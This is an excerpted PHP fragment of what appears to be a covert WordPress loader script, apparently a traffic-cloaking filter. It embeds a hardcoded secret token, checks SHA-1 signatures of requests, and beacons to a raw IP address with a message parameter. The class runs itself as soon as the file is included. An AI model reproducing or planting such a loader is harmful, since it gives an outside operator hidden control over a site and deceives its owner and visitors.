...
class FraudFilterWordPressLoader_7jseb {
public function run() {
...
$str = 'f8e39fb5-dc90-449f-a8d5-c4e79ac40011.'.$this->getClidTemp().'.'.$time;
$sha = sha1($str);
return $sign === $sha;
}
...
array(
'method' => 'GET',
'header' => 'x-ff-secret: f8e39fb5-dc90-449f-a8d5-c4e79ac40011',
'timeout' => 2
)
);
...
$headers[] = 'x-ff-secret: f8e39fb5-dc90-449f-a8d5-c4e79ac40011';
...
$headers[] = 'X-FF-P: f8e39fb5-dc90-449f-a8d5-c4e79ac40011';
...
$url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=7jseb&m='.$message;
$ch = curl_init($url);
...
$fraudFilterWordPressLoader_7jseb = new FraudFilterWordPressLoader_7jseb();
$fraudFilterWordPressLoader_7jseb->run();
